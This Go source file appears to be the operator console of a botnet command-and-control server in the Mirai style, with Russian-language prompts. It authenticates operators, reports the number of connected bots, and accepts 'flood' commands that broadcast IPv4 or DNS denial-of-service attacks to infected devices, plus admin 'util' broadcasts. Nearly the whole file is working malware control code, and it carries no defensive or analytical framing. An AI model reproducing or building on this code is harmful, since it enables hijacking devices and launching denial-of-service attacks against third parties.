package main

import
(
    "fmt"
    "net"
    "time"
    "strings"
    "io/ioutil"
    "strconv"
)

type admin struct
{
    conn net.Conn
}

func new_admin(conn net.Conn) *admin {
    return &admin{conn}
}

func (this *admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}


func (this *admin) handle() {
    defer this.conn.Close()
    this.conn.Write([]byte("\033[?1049h"))

    banner, err := ioutil.ReadFile("banner.txt")
    if err == nil {
        this.conn.Write([]byte("\033[31;01m" + strings.Replace(strings.Replace(string(banner), "\r\n", "\n", -1), "\n", "\r\n", -1)))
    }
    
    // get username, 60 second dealine for username input or the connection will be closed
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[37;01mпользователь\033[31;01m: \033[0m")) 
	username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // get password, 60 second dealine for password input or the connection will be closed
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[37;01mПроходить\033[31;01m: \033[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }
	
    var logged_in bool
    var user_info acc_info
    var bc int

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))

    this.conn.Write([]byte("\033[37;01mПопытка авторизации\033[31;01m"))
    for i := 0; i < 15; i++ {
        time.Sleep(500 * time.Millisecond)
        this.conn.Write([]byte("."))
    }

    this.conn.Write([]byte("\r\n"))

    logged_in, user_info = db.try_auth(username, password)
    if !logged_in {
        this.conn.Write([]byte(fmt.Sprintf("\033[37;01mНе удалось выполнить аутентификацию с указанными учетными данными.\033[0m\r\n")))
        return
    }

    // User has already logged in
    if user_info.logged_in == 1 {
        this.conn.Write([]byte(fmt.Sprintf("\033[37;01mПользователь уже вошел в систему.\033[0m\r\n")))
        return
    }

    // Create a go-routine to update the deadline to keep the managers connection alive
    go func() {
        i := 0
        for {
            var cc int
            if cs.view_count() > user_info.max_bots && user_info.max_bots != -1 {
                cc = user_info.max_bots
            } else {
                cc = cs.view_count()
            }
            _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; Devices: %d\007", cc)))
            if err != nil {
                db.update_logged_in(username, 0)
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                i = 0
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
            time.Sleep(time.Second)
        }
        return
    }()

    db.update_logged_in(username, 1)
    this.conn.Write([]byte("\033[37;01mУспешно заверенная проверка, добро пожаловать '\033[31;01m" + username + "\033[37;01m'\033[0m\r\n"))

    for {
        var i uint8
        this.conn.Write([]byte("\033[37;01m" + username + "\033[31;01m@\033[37;01mРоссия \033[31;01m~ \033[37;01m$ \033[0m"))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "exit" || cmd == "quit" || cmd == "logout" {
            db.update_logged_in(username, 0)
            return
        }

        if cmd == "" {
            continue
        }


        if cmd == "clear" || cmd == "cls" {
            this.conn.Write([]byte("\033[2J\033[1H"))
            continue
        }

        if cs.view_count() > user_info.max_bots && user_info.max_bots != -1 {
            bc = user_info.max_bots
        } else {
            bc = cs.view_count()
        }

        if cmd == "BOTS" || cmd == "bots" {
            this.conn.Write([]byte(fmt.Sprintf("\033[37;01mнагруженный\033[31;01m: \033[37;01m%d\033[0m\r\n", bc)))
            continue
        }
 
        if cmd == "stats" || cmd == "statistics" && db.dump_admin(username) == 2 {
            o := cs.view_statistics()
            for k, v := range o {
                this.conn.Write([]byte(fmt.Sprintf("\033[37;01m%s\033[31;01m: \033[37;01m%d\033[0m\r\n", k, v)))
            }
            continue
        }

        i = 255

        if cmd == "?" || cmd == "help" {
            list := "\033[37;01mAvailable commands\r\n"
            for name, p := range command_info_lookup {
                list += name + "\033[31;01m: \033[37;01m" + p.description + "\033[0m" + "\r\n"
            }
            this.conn.Write([]byte(fmt.Sprintf("%s", list)))
            continue
        }

        // s[0] = method, count = s[1], s[2] = data
        s := strings.SplitN(cmd, " ", 3)

        if len(s) != 3 {
            continue
        }

        if s[0] == "util" && db.dump_admin(username) == 2 {
            i = 0
        }

        if s[0] == "flood" {
            i = 1
        }

        if i == 255 {
            continue
        }

        // Parse the desired count
        ll, err := strconv.Atoi(s[1])
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[37;01mFailed to parse the count near \"%s\"\r\n", s[1])))
            continue
        }

        if user_info.max_bots != -1 && ll > user_info.max_bots || ll == -1 && user_info.max_bots != -1 {
            ll = user_info.max_bots
        }

        ptr, err, dns := new_command(s[2], user_info.admin, user_info.flood_cooldown, i, user_info.max_time, username, ll)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[37;01m%s\033[0m", err.Error())))
            continue
        }   

        if i == 0 {
            this.conn.Write([]byte(fmt.Sprintf("\033[37;01mBroadcasted utility to given clients!\033[0m\r\n")))
            ptr.build_util(ll)
            continue
        }

        // Determine if we use IPv4 or DNS for the target address depending on the specified flood
        if i == 1 && !dns {
            ptr.build_flood_ipv4(ll)
        }

        if i == 1 && dns {
            ptr.build_flood_dns(ll)
        }

        this.conn.Write([]byte(fmt.Sprintf("\033[37;01mBroadcasted attack to given clients!\033[0m\r\n")))
    }
}